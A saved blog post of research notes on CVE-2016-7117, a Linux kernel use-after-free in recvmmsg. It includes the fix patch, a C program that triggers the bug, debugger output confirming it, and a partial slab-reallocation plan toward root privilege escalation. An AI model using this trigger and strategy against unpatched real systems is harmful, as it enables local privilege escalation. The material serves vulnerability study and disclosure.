<!DOCTYPE html>
<!-- saved from url=(0053)https://blog.lizzie.io/notes-about-cve-2016-7117.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Notes about CVE-2016-7117</title>
<!-- 2019-02-18 Mon 02:58 -->

<meta name="generator" content="Org-mode">
<meta name="author" content="Lizzie Dixon">
<link rel="icon" href="data:;base64,="><style type="text/css">@media (max-width: 1000) {
    pre {
	font-size: 8pt;
    }
}

body{
    margin: 1em auto;
    max-width: 62em;
    line-height: 1.6;
    color: #444;
    padding: 0 1em;
    font-size: 14pt;
}

p {
    text-align: justify;
}

input {
    font-size: 14pt;
}

a:visited {
    color: #666;
}

a {
    color: #555;
}

h1 {
    margin: 0.5em 0;
}

h1, h2, h3 {
    line-height: 1.2
}

[src$=".svg"] {
    width: 100%;
}

.org-src-container {
    margin: 1em;
}

pre {
    padding: 2em;
    overflow: auto;
    background-color: #eeeeee;
}

pre.example {
    margin: 1em;
}

table {
    background-color: #eeeeee;
    margin: 2em;
}

td  {
    padding: 0.75em 2em;
}

.mono {
    font-family: monospace;
}

li {
    padding: 0.1em 0;
}


#table-of-contents {
    width: 40%;
    float: right;
    padding: 0 2em;
}

#table-of-contents ul {
    padding: 0 1.2em;
    margin: 0;
}

#table-of-contents h2 {
    margin: 0.2em;
}

label.org-src-name {
    color: #666;
    margin-bottom: 1em;
}

label.org-src-name code {
    color: #666;
}

code {
    word-break: break-all;
}

span.navigation-links a, span.self-links a {
    padding-right: 0.4em;
}

span.self-links {
    float: right;
}

span.listing-number, span.figure-number {
    display: none;
}

div.figure {
    text-align: center;
    font-size: 0.8em;
    color: #777;
    max-width: 100%;
}

div.figure img, div.figure video, div.prompt {
    -webkit-box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    -moz-box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    border: 1px solid #444;
    max-width: 100%;
}

/* MailChimp Form Embed Code - Horizontal Super Slim - 12/16/2015 v10.7
Adapted from: http://blog.heyimcat.com/universal-signup-form/ */

#mc_embed_signup form {text-align:center; padding:10px 0 10px 0;}
.mc-field-group { display: inline-block; } /* positions input field horizontally */
#mc_embed_signup input.email {border: 1px solid #444;  -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; color: #343434; background-color: #fff; box-sizing:border-box; height:32px; padding: 0px 0.4em; display: inline-block; margin: 0; max-width:300px; vertical-align:top;}
#mc_embed_signup .clear {display: inline-block;} /* positions button horizontally in line with input */
#mc_embed_signup .button {border: 1px solid #444; -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; letter-spacing: .03em; color: #fff; background-color: #777; box-sizing:border-box; height:32px; line-height:32px; padding:0 18px; display: inline-block; margin: 0; transition: all 0.23s ease-in-out 0s;}
#mc_embed_signup .button:hover {background-color:#555; cursor:pointer;}
#mc_embed_signup div#mce-responses {float:left; top:-1.4em; padding:0em .5em 0em .5em; overflow:hidden; width:90%;margin: 0 5%; clear: both;}
#mc_embed_signup div.response {margin:1em 0; padding:1em .5em .5em 0; font-weight:bold; float:left; top:-1.5em; z-index:1; width:80%;}
#mc_embed_signup #mce-error-response {display:none;}
#mc_embed_signup #mce-success-response {color:#529214; display:none;}
#mc_embed_signup label.error {display:block; float:none; width:auto; margin-left:1.05em; text-align:left; padding:.5em 0;}
#mc_embed_signup input.email { display: inline-block; margin-bottom:5px;}
#mc_embed_signup .button { margin:0; }

div.prompt {
    border-radius: 3px;
    padding: 10px;
    margin: 10px;
    background-color: #fff;
    text-align:center;
    max-width: 800px;
    margin-left: auto;
    margin-right: auto;
    background-color: #fffaa2;
}

div.prompt-close {
    float: right;
    padding-left: 10px;
    padding-bottom: 10px;
    cursor: pointer;
    color: #777;
    font-size: 0.8em;
    font-weight: bold;
    margin-top: -5px;
}
</style><script>window.onload = function () {
    if (window.location.pathname !== "/"
	&& document.cookie.split(/ *; */).indexOf("closed_form=yes") < 0) {
	var prompt = document.createElement("div");
	var close = document.createElement("div");
	var content = document.getElementById("content");
	var h1 = content.getElementsByTagName("h1")[0];

	prompt.className = "prompt";
	prompt.innerHTML = "Like this writing? Subscribe to receive updates on vulnerabilities and software projects as soon as I publish them!<br><div id=\"mc_embed_signup\"><form action=\"https://lizzie.us20.list-manage.com/subscribe/post?u=a2011719c1a5ce9e37e7c3e82&amp;id=43ce08f401\" method=\"post\" id=\"mc-embedded-subscribe-form\" name=\"mc-embedded-subscribe-form\" class=\"validate\" target=\"_blank\" novalidate><div id=\"mc_embed_signup_scroll\"><input type=\"email\" value=\"\" name=\"EMAIL\" class=\"email\" id=\"mce-EMAIL\" placeholder=\"email address\" required><div style=\"position: absolute; left: -5000px;\" aria-hidden=\"true\"><input type=\"text\" name=\"b_a2011719c1a5ce9e37e7c3e82_43ce08f401\" tabindex=\"-1\" value=\"\"></div> <div class=\"clear\"><input type=\"submit\" value=\"subscribe\" name=\"asubscribe\" id=\"mc-embedded-subscribe\" class=\"button\"></div></div></form></div>";

	close.innerHTML = "×";
	close.className = "prompt-close";	
	close.onclick = function () {
	    content.removeChild(prompt);
	    document.cookie = "closed_form=yes";
	}

	prompt.insertBefore(close, prompt.firstChild);
	content.insertBefore(prompt, h1.nextSibling);
    }
}
</script><meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="alternate" type="application/rss+xml" href="https://blog.lizzie.io/rss.xml">
</head>
<body>
<div id="navigation"><span class="navigation-links"><a href="https://blog.lizzie.io/rss.xml">rss</a> <a href="https://blog.lizzie.io/">home</a> </span><span class="self-links"><a href="https://github.com/startling">github</a> <a href="mailto:_@lizzie.io">email</a></span></div><div id="content">
<h1 class="title">Notes about CVE-2016-7117</h1><div class="prompt"><div class="prompt-close">×</div>Like this writing? Subscribe to receive updates on vulnerabilities and software projects as soon as I publish them!<br><div id="mc_embed_signup"><form action="https://lizzie.us20.list-manage.com/subscribe/post?u=a2011719c1a5ce9e37e7c3e82&amp;id=43ce08f401" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate=""><div id="mc_embed_signup_scroll"><input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required=""><div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_a2011719c1a5ce9e37e7c3e82_43ce08f401" tabindex="-1" value=""></div> <div class="clear"><input type="submit" value="subscribe" name="asubscribe" id="mc-embedded-subscribe" class="button"></div></div></form></div></div>
<p>
It's hard to find information about this, so I started looking deeper.
</p>

<p>
<a href="http://www.theregister.co.uk/2016/10/05/google_melts_78_android_security_holes_but_no_brand_name_bugs_seen/">The Register has some cursory information:</a>
</p>
<blockquote>
<p>
The first of these (CVE-2016-7117) lies in the kernel networking
subsystem allowing remote attackers to execute arbitrary code in
the context of the kernel.
</p>
</blockquote>

<p>
("Another critical hole (CVE-2016-0758 ) allows installed
apps to execute arbitrary code within the context of the kernel via an
elevation of privilege vulnerability in the kernel ASN.1 decoder."
sounds fun too…)
</p>

<p>
The <a href="https://security-tracker.debian.org/tracker/CVE-2016-7117">Debian</a> and <a href="https://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-7117.html">Ubuntu</a> bug trackers both describe this as "use after
free in the recvmmsg exit path", which is a big hint. The Debian page
lists <code>4.5.2-1</code> as the "Fixed Version", <a href="https://launchpad.net/debian/+source/linux/4.5.2-1">which was released in
April</a>. That page's changelog includes "net: Fix use after free in the
recvmmsg exit path". And so I <a href="https://lkml.org/lkml/2016/3/14/379">found this email</a> from March from Arnaldo
Carvalho de Melo, with a patch:
</p>

<div class="org-src-container">
<pre class="src src-diff">diff --git a/net/socket.c b/net/socket.c
index c044d1e8508c..db13ae893dce 100644
--- a/net/socket.c
+++ b/net/socket.c
@@ -2240,31 +2240,31 @@ int __sys_recvmmsg(int fd, struct mmsghdr __user *mmsg, unsigned int vlen,
                cond_resched();
        }

-out_put:
-       fput_light(sock-&gt;file, fput_needed);
-
        if (err == 0)
-               return datagrams;
+               goto out_put;

-       if (datagrams != 0) {
+       if (datagrams == 0) {
+               datagrams = err;
+               goto out_put;
+       }
+
+       /*
+        * We may return less entries than requested (vlen) if the
+        * sock is non block and there aren't enough datagrams...
+        */
+       if (err != -EAGAIN) {
                /*
-                * We may return less entries than requested (vlen) if the
-                * sock is non block and there aren't enough datagrams...
+                * ... or  if recvmsg returns an error after we
+                * received some datagrams, where we record the
+                * error to return on the next call or if the
+                * app asks about it using getsockopt(SO_ERROR).
                 */
-               if (err != -EAGAIN) {
-                       /*
-                        * ... or  if recvmsg returns an error after we
-                        * received some datagrams, where we record the
-                        * error to return on the next call or if the
-                        * app asks about it using getsockopt(SO_ERROR).
-                        */
-                       sock-&gt;sk-&gt;sk_err = -err;
-               }
-
-               return datagrams;
+               sock-&gt;sk-&gt;sk_err = -err;
        }
+out_put:
+       fput_light(sock-&gt;file, fput_needed);

-       return err;
+       return datagrams;
 }

 SYSCALL_DEFINE5(recvmmsg, int, fd, struct mmsghdr __user *, mmsg,
-- 
2.5.0
</pre>
</div>

<p>
This was merged and became <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=34b88a6">34b88a6</a> in the kernel repository.
</p>

<p>
This code is in <code>__sys_recvmmsg</code>; it looks roughly like this (before
the fix, at <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=b6e4038">b6e4038</a>, with irrelevant bits replaced with <code>/* ... */</code>):
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span><code>net/socket.c:2169@b6e4038</code></label><pre class="src src-C">int __sys_recvmmsg(int fd, struct mmsghdr __user *mmsg, unsigned int vlen,
                   unsigned int flags, struct timespec *timeout)
{
        int fput_needed, err, datagrams;
        struct socket *sock;
        struct mmsghdr __user *entry;
        struct compat_mmsghdr __user *compat_entry;
        struct msghdr msg_sys;
        struct timespec end_time;

        if (timeout &amp;&amp;
            poll_select_set_timeout(&amp;end_time, timeout-&gt;tv_sec,
                                    timeout-&gt;tv_nsec))
                return -EINVAL;

        datagrams = 0;

        sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);
        if (!sock)
                return err;

        err = sock_error(sock-&gt;sk);
        if (err)
                goto out_put;

        entry = mmsg;
        compat_entry = (struct compat_mmsghdr __user *)mmsg;

        while (datagrams &lt; vlen) {
                /* ... */
                        err = ___sys_recvmsg(sock,
                                             (struct user_msghdr __user *)entry,
                                             &amp;msg_sys, flags &amp; ~MSG_WAITFORONE,
                                             datagrams);
                        if (err &lt; 0)
                                break;
                        err = put_user(err, &amp;entry-&gt;msg_len);
                        ++entry;
                }

                if (err)
                        break;
                ++datagrams;
                /* ... */
        }

out_put:
        fput_light(sock-&gt;file, fput_needed);

        if (err == 0)
                return datagrams;

        if (datagrams != 0) {
                /*
                 * We may return less entries than requested (vlen) if the
                 * sock is non block and there aren't enough datagrams...
                 */
                if (err != -EAGAIN) {
                        /*
                         * ... or  if recvmsg returns an error after we
                         * received some datagrams, where we record the
                         * error to return on the next call or if the
                         * app asks about it using getsockopt(SO_ERROR).
                         */
                        sock-&gt;sk-&gt;sk_err = -err;
                }

                return datagrams;
        }

        return err;
}

</pre>
</div>

<p>
The old code calls <code>sockfd_lookup_light</code>, and doesn't always
<code>fput_light</code> before it returns; the new code always calls
<code>fput_light</code>. The email includes
</p>

<blockquote>
<p>
  And, as Dmitry rightly assessed, that is because we can drop the
reference and then touch it when the underlying recvmsg calls return
some packets and then hit an error, which will make recvmmsg to set
sock-&gt;sk-&gt;sk_err, oops, fix it.
</p>
</blockquote>

<p>
So, to demonstrate the use after free:
</p>
<ul class="org-ul">
<li><code>recvmmsg</code> calls <code>sockfd_lookup_light</code>, which probably increases the
refcount.</li>
<li><code>recvmmsg</code> calls <code>recvmsg</code></li>
<li><code>recvmsg</code> returns an real packet. <code>datagrams</code> is incremented from 0.</li>
<li><code>recvmmsg</code> calls <code>recvmsg</code></li>
<li><code>recvmsg</code> returns an error other than <code>-EAGAIN</code>.</li>
<li><code>recvmmsg</code> breaks to the end of the while</li>
<li><code>fput_light</code> is called, which decreases the refcount if it was
increased above. Then the <code>struct socket</code> may be freed at any point.</li>
<li><code>err != 0</code>, so we don't <code>return datagrams</code></li>
<li><code>datagrams != 0</code> , and <code>err != -EAGAIN</code>,
so we do <code>sock-&gt;sk-&gt;sk_err = -err</code>.
This <code>sock</code> may have been freed after <code>fput_light</code>, so this is a use after free.</li>
</ul>

<p>
Questions:
</p>

<ul class="org-ul">
<li>How do we make <code>recvmsg</code> error for the second packet?</li>
<li>For a use-after-free, we need that to actually have been freed. How
do we do that?</li>
<li>Ultimately we want to get the allocation that takes the place where
<code>sock</code> was, fill in the <code>sk</code> pointer, and get the kernel to write
to a place we choose. Is that realistic?</li>
</ul>

<p>
I'm going to think about this first from the perspective of a local
user, since remote exploitation seems much harder.
</p>

<div id="outline-container-org332d6f7" class="outline-2">
<h2 id="org332d6f7">Making <code>recvmsg</code> err</h2>
<div class="outline-text-2" id="text-org332d6f7">
<p>
So <code>__sys_recvmmsg</code> calls <code>___sys_recvmsg</code>, which calls
<code>copy_msghdr_from_user(msg_sys, msg, &amp;uaddr, &amp;iov);</code> and returns an
error if it does:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span><code>net/socket.c:2087@b6e4038</code></label><pre class="src src-C">if (MSG_CMSG_COMPAT &amp; flags)
        err = get_compat_msghdr(msg_sys, msg_compat, &amp;uaddr, &amp;iov);
else
        err = copy_msghdr_from_user(msg_sys, msg, &amp;uaddr, &amp;iov);
if (err &lt; 0)
        return err;
</pre>
</div>


<p>
this looks promising (in <code>copy_msghdr_from_user</code>):
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 3: </span><code>net/socket.c:1829@b6e4038</code></label><pre class="src src-C">if (!access_ok(VERIFY_READ, umsg, sizeof(*umsg)) ||
    __get_user(uaddr, &amp;umsg-&gt;msg_name) ||
    __get_user(kmsg-&gt;msg_namelen, &amp;umsg-&gt;msg_namelen) ||
    __get_user(uiov, &amp;umsg-&gt;msg_iov) ||
    __get_user(nr_segs, &amp;umsg-&gt;msg_iovlen) ||
    __get_user(kmsg-&gt;msg_control, &amp;umsg-&gt;msg_control) ||
    __get_user(kmsg-&gt;msg_controllen, &amp;umsg-&gt;msg_controllen) ||
    __get_user(kmsg-&gt;msg_flags, &amp;umsg-&gt;msg_flags))
        return -EFAULT;
</pre>
</div>

<p>
and the manpage says
</p>

<blockquote>
<p>
ERRORS
    These  are  some standard  errors  generated  by the  socket
    layer.  Additional errors may be generated and returned from
    the underlying protocol modules; see their manual pages.
</p>

<p>
…
EFAULT
	The  receive   buffer  pointer(s)  point   outside  the
	process's address space.
</p>
</blockquote>

<p>
So I think we can send two valid messages, and have the second
<code>rcvmmsg</code> header point to a bad receive buffer.
</p>
</div>
</div>

<div id="outline-container-org8420887" class="outline-2">
<h2 id="org8420887">Closing the socket</h2>
<div class="outline-text-2" id="text-org8420887">
<p>
This should be as easy as closing the socket in question in a thread
while another thread is in <code>recvmmsg</code>.
</p>
</div>
</div>

<div id="outline-container-orgb7e4aca" class="outline-2">
<h2 id="orgb7e4aca">Trying it out</h2>
<div class="outline-text-2" id="text-orgb7e4aca">
<p>
We'll try triggering the panic from userspace.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 4: </span><code>try_recvmmsg.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -pthread -static try_recvmmsg.c -o try_recvmmsg" -*- */
#define _GNU_SOURCE
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;pthread.h&gt;

#define msg "hello!"

struct thread_config {
	int fds[2];
	char data[1024];
};

void *send_and_close_in_thread (void *arg)
{
	struct thread_config *config = arg;
	/* send the messages */
	for (size_t i = 0; i &lt; 2; i++) {
		if (send(config-&gt;fds[0], msg, sizeof(msg), 0) != sizeof(msg)) {
			fprintf(stderr, "++ in send: %m\n");
			close(config-&gt;fds[0]);
			close(config-&gt;fds[1]);
			return NULL;
		}
	}
	/* wait for it to be received, then close things, so that the kernel doesn't EBADF */
	while (config-&gt;data[0] != msg[0]);;
	close(config-&gt;fds[0]);
	close(config-&gt;fds[1]);
	return NULL;
}

int main (int argc, char **argv)
{
	fprintf(stderr, "++ running!\n");
	struct thread_config config = {0};
	if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, config.fds)) {
		fprintf(stderr, "++ in socketpair: %m\n");
		return 1;
	}
	pthread_t thread = {0};
	if (pthread_create(&amp;thread, NULL, send_and_close_in_thread, &amp;config)) {
		fprintf(stderr, "++ in pthread_create: %m\n");
		close(config.fds[0]);
		close(config.fds[1]);
		return 1;

	}
	/* receive the first message fine.
	   try to receive the second message to a buffer out of our address space,
	   so that ___sys_recvmsg will return EFAULT. */
	recvmmsg(config.fds[1],
		 (struct mmsghdr[2]) {
			 {
				 .msg_hdr = {
					 .msg_iov = &amp; (struct iovec) {
						 .iov_base = &amp;config.data,
						 .iov_len = sizeof(config.data)
					 },
					 .msg_iovlen = 1
				 }
					 
			 },
			 {
				 .msg_hdr = {
					 .msg_iov = &amp; (struct iovec) {
						 .iov_base = (void*) (~0),
						 .iov_len = 1024,
					 },
					 .msg_iovlen = 1
				 }
					 
			 },
		 },
		 2,
		 0,
		 &amp; (struct timespec) { .tv_sec = 1 });
	fprintf(stderr, "++ no panic? got %s.\n", config.data);
	return 1;
		 
}
</pre>
</div>

<p>
The timing is a little tricky: we have a thread send messages, wait
for the first one to be received, and then close the fds. If it closes
before the call to <code>__sys_recvmmsg</code>, <code>__sys_recvmmsg</code> will return
<code>EBADF</code>. If it closes after <code>__sys_recvmmsg</code> sets the error on the
<code>sk_buff</code>, we won't get a use-after-free.
</p>

<p>
Then the main thread tries to <code>recvmmsg</code> two messages, with a bad
result buffer pointer on the second one. This way the second
<code>___sys_recvmsg</code> call errors, getting us on the code path we hit
before.
</p>

<p>
I checked this was the right code path like this (gdb connected
to <code>qemu</code>):
</p>

<pre class="example">gdb) b copy_msghdr_from_user 
Breakpoint 21 at 0xffffffff82668db0: file net/socket.c, line 1823.
(gdb) c
Continuing.
[Switching to Thread 1]

Thread 1 hit Breakpoint 21, copy_msghdr_from_user (kmsg=0xffff88006b737df8, umsg=0x7ffc232faa80, save_addr=0xffff88006b737ad0, 
    iov=0xffff88006b737a90) at net/socket.c:1823
1823	{
(gdb) finish
Run till exit from #0  copy_msghdr_from_user (kmsg=0xffff88006b737df8, umsg=0x7ffc232faa80, save_addr=0xffff88006b737ad0, 
    iov=0xffff88006b737a90) at net/socket.c:1823
0xffffffff82669b89 in ___sys_recvmsg (sock=0xffff88006b737e18, msg=0x1ffff1000d6e6003, msg_sys=0xffff88006b737df8, 
    flags=225341379, nosec=&lt;optimized out&gt;) at net/socket.c:2091
2091			err = copy_msghdr_from_user(msg_sys, msg, &amp;uaddr, &amp;iov);
Value returned is $59 = 0
(gdb) c
Continuing.

Thread 1 hit Breakpoint 21, copy_msghdr_from_user (kmsg=0xffff88006b737df8, umsg=0x7ffc232faac0, save_addr=0xffff88006b737ad0, 
    iov=0xffff88006b737a90) at net/socket.c:1823
1823	{
(gdb) finish
Run till exit from #0  copy_msghdr_from_user (kmsg=0xffff88006b737df8, umsg=0x7ffc232faac0, save_addr=0xffff88006b737ad0, 
    iov=0xffff88006b737a90) at net/socket.c:1823
0xffffffff82669b89 in ___sys_recvmsg (sock=0xffff88006b737b10, msg=0xffff88006b737b28, msg_sys=0xffff88006b737df8, 
    flags=225341266, nosec=&lt;optimized out&gt;) at net/socket.c:2091
2091			err = copy_msghdr_from_user(msg_sys, msg, &amp;uaddr, &amp;iov);
Value returned is $60 = -14
(gdb) b socket.c:2265
Breakpoint 22 at 0xffffffff8266b892: file net/socket.c, line 2265.
(gdb) c
Continuing.

Thread 1 hit Breakpoint 22, __sys_recvmmsg (fd=&lt;optimized out&gt;, mmsg=0x7ffc232faac0, vlen=&lt;optimized out&gt;, flags=0, 
    timeout=0xffff88006b737ee0) at net/socket.c:2265
2265				sock-&gt;sk-&gt;sk_err = -err;
(gdb)
</pre>


<p>
After running it a  gdb a lot in a VM built on b6e4038 (the commit
immediately before the fix), I got this (my notes in <code>/* ... */</code> inline):
</p>

<pre class="example">(gdb) b __sys_recvmmsg
Breakpoint 12 at 0xffffffff8266b440: file net/socket.c, line 2171.
(gdb) b socket.c:2265 /* sock-&gt;sk-&gt;sk_err = -err; */
Breakpoint 15 at 0xffffffff8266b892: file net/socket.c, line 2265.
(gdb) c
Continuing.

Thread 2 hit Breakpoint 12, __sys_recvmmsg (fd=4, mmsg=0x7fff9f3ccc40, vlen=2, flags=0, timeout=0xffff88006c4e7ee0)
    at net/socket.c:2171
2171	{
/* temporary break at sockfd_lookup_light so we can 'finish' in it to see if what it returns,
   as a cute trick to get around "&lt;optimized out&gt;" */
(gdb) tbreak sockfd_lookup_light 
Temporary breakpoint 20 at 0xffffffff82665940: file net/socket.c, line 450.
(gdb) c
Continuing.

Thread 2 hit Temporary breakpoint 20, sockfd_lookup_light (fd=4, err=0xffff88006c4e7d38, fput_needed=0xffff88006c4e7cf8)
    at net/socket.c:450
450	{
(gdb) finish
Run till exit from #0  sockfd_lookup_light (fd=4, err=0xffff88006c4e7d38, fput_needed=0xffff88006c4e7cf8) at net/socket.c:450
__sys_recvmmsg (fd=4, mmsg=0x7fff9f3ccc40, vlen=&lt;optimized out&gt;, flags=0, timeout=0xffff88006c4e7ee0) at net/socket.c:2187
2187		if (!sock)
Value returned is $50 = (struct socket *) 0xffff88006bf61e00
(gdb) c
Continuing.

Thread 2 hit Breakpoint 15, __sys_recvmmsg (fd=&lt;optimized out&gt;, mmsg=0x7fff9f3ccc80, vlen=&lt;optimized out&gt;, flags=0, 
    timeout=0xffff88006c4e7ee0) at net/socket.c:2265
2265				sock-&gt;sk-&gt;sk_err = -err;
/* !!! */
(gdb) p ((struct socket *)0xffff88006bf621c0)-&gt;file.f_count
Cannot access memory at address 0x38
/* -&gt;file has been zeroed out, meaning this has been freed and used for something else */
(gdb) p ((struct socket *)0xffff88006bf621c0)-&gt;sk
$52 = (struct sock *) 0x0 &lt;irq_stack_union&gt;
(gdb) p &amp;(((struct socket *)0xffff88006bf621c0)-&gt;sk-&gt;sk_err)
$53 = (int *) 0x1b0 &lt;irq_stack_union+432&gt;
(gdb)
</pre>

<p>
So yes, we've got a use-after-free, and the kernel writes <code>-err</code> to
the address at 0x1b0.
</p>

<p>
Why does it only work sometimes? I think it's because the actual free
and using it again happens outside of the <code>fput_light</code> call tree, so
we're racing with another task or two in the kernel. But we can do it
repeatedly until it does work; it doesn't take long.
</p>
</div>
</div>

<div id="outline-container-org9d92c4b" class="outline-2">
<h2 id="org9d92c4b">Reallocation</h2>
<div class="outline-text-2" id="text-org9d92c4b">
<p>
So we need to put some data where that <code>struct socket</code> used to be,
such that <code>sk</code> is a pointer to a piece of data whose offset
<code>sk_err</code> is where we would like to write.
</p>

<p>
<code>struct socket</code> is part of <code>struct socket_alloc</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 5: </span><code>include/net/sock.h:1220@b6e4038</code></label><pre class="src src-C">struct socket_alloc {
        struct socket socket;
        struct inode vfs_inode;
};
</pre>
</div>

<p>
They're allocated in <code>sock_alloc</code> / <code>sock_alloc_inode</code> using the slab
allocator This means that they're grabbed from "caches", which
are spread across multiple "slabs". Caches are homogenous type-wise,
and e.g. each <code>struct socket_alloc</code> in a cache is pre-initialized.
</p>

<p>
Some resources about the slab allocator:
</p>
<ul class="org-ul">
<li><a href="https://en.wikipedia.org/wiki/Slab_allocation">"Slab Allocation" on Wikipedia</a></li>
<li><a href="https://web.archive.org/web/20070606222547/http://www.ibm.com/developerworks/linux/library/l-linux-slab-allocator/?">"Anatomy of the Linux Slab Allocator" on IBM developerworks</a>
(apparently no longer available, so this is a link to an archive).</li>
</ul>

<p>
I can think of a situation where we can use the slab allocator to get
what we want to happen:
</p>

<ul class="org-ul">
<li>The slabs that are part of the <code>struct socket_alloc</code> cache
(<code>sock_inode_cache</code>) fill up.</li>
<li>We create a socketpair for our use-after-free that occupies the
first and second slot in a new slab.</li>
<li>We close both elements of our socketpair. This causes the slab to be
freed. We then immediately add some items (more than a slabfull) to
another cache, with the pointer we want to write to at offset <code>sk</code>
in each item.</li>
<li>This causes a new slab to be allocated for the second cache, which
ideally will be exactly where our first cache used to be. So, the
<code>struct socket</code> pointer in <code>__sys_recvmmsg</code> now points to an item we
control in a new slab.</li>
<li>The kernel code runs and sets the offset <code>sk_err</code> from our pointer
to <code>-err</code>.</li>
</ul>

<p>
Some things that make it easier:
</p>
<ul class="org-ul">
<li>We can just repeatedly try it until it works, allocating an extra
socket each time so that we progress through the slab.</li>
<li><code>/proc/slabinfo</code> says that the <code>sock_inode_cache</code> slab has 12
objects per slab (in my vm; it seems to vary). This is an upper
bound on the number of sockets we'll need to open to get an object
at the beginning of the slab, assuming no other process is creating
sockets.</li>
</ul>

<p>
That sounds totally possible!
</p>

<p>
What are we getting the kernel to write to? err is -14 in our case, so
the kernel is writing 14 for us. If we control the pointer, though, we
can line it up only partially with a field we want to overwrite,
writing any portion of <code>{0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00}</code> anywhere we choose. Some ideas:
</p>

<ul class="org-ul">
<li>Overwrite the uid of our process (and write <code>0xe</code> to the byte before
it), so that it has uid 0.</li>
<li>Overwrite a return address on the stack so that the kernel returns
to code we choose. (This will be tricky with KASLR).</li>
<li>Overwrite a boolean on the stack to either 0 or 0xe (truthy) to get
around some permission check.</li>
</ul>

<p>
However, I'm not actually sure how aggressively slabs get reused by
different caches, and I'm not sure of an easy way to find out. But! We
can probably use a lot of memory to make that happen, or try freeing a
couple dozen slabs at the same time.
</p>
</div>
</div>

<div id="outline-container-orgecc63fe" class="outline-2">
<h2 id="orgecc63fe">Which cache do we try to write to?</h2>
<div class="outline-text-2" id="text-orgecc63fe">
<p>
<code>/proc/slabinfo</code> says the <code>sock_inode_cache</code> has objects of
size 640. This is kind of an inconvenient number, the only other
objects with that size are also inode caches, and they don't have any
user-controllable data at the offset of <code>sk_err</code>.
</p>

<p>
But the kmalloc cache <code>kmalloc-1024</code> has 1024-size items in the
caches, and 16 of them fit in the cache. If we can find a path in the
kernel that copies data we control into a kmalloc bigger than 460 +
<code>sk_err</code> + <code>sizeof(void *)</code> = 896, we can get the kernel to set an int
at an address we choose to <code>14</code>.
</p>

<p>
But there are a lot of calls to <code>kmalloc</code> in the kernel, and finding a
good one will take time. So I'm publishing this now; I'll write
more when I find one.
</p>
</div>
</div>

<div id="outline-container-org8ad71b3" class="outline-2">
<h2 id="org8ad71b3">How much trouble are we in?</h2>
<div class="outline-text-2" id="text-org8ad71b3">
<p>
I think this exploit will work, so we have a pretty bad local
privilege escalation bug. I was able to trigger the use-after-free in
less than an hour of work after reading the description of the bug,
and I'm not even a kernel hacker. Given more time I'm pretty sure I
could make it repeatably write to a location of our choice.
</p>

<p>
I think this would be difficult to exploit remotely, for the following
reasons:
</p>

<ul class="org-ul">
<li><code>recvmmsg</code> is much less common than <code>recvmsg</code>, in the wild.  GitHub
search shows <a href="https://github.com/search?q=recvmmsg&amp;type=Code&amp;utf8=%E2%9C%93">about 800k uses of <code>recvmmsg</code></a> vs <a href="https://github.com/search?utf8=%E2%9C%93&amp;q=recvmsg&amp;type=Code&amp;ref=searchresults">about 3.6 million for
<code>recvmsg</code></a>. <code>recvmsg</code> isn't all that common anyway; <a href="https://github.com/search?q=recv&amp;type=Code&amp;utf8=%E2%9C%93"><code>recv</code> has about
29 million uses on GitHub</a>.</li>
<li>A remote attacker would need to cause the <code>recvmsg</code> to err and cause
the socket to close while in the <code>recvmmsg</code> call. Looking casually,
I didn't see a great way to cause <code>recvmmsg</code> to err from the sending
side. <code>recvmsg</code> and <code>recvmmsg</code> are normally used for connectionless
protocols, anyway, so I wouldn't expect it to be easy to cause a
service to close its socket.</li>
</ul>

<p>
But I'd love to be proven wrong.
</p>
</div>
</div>
</div>


</body></html>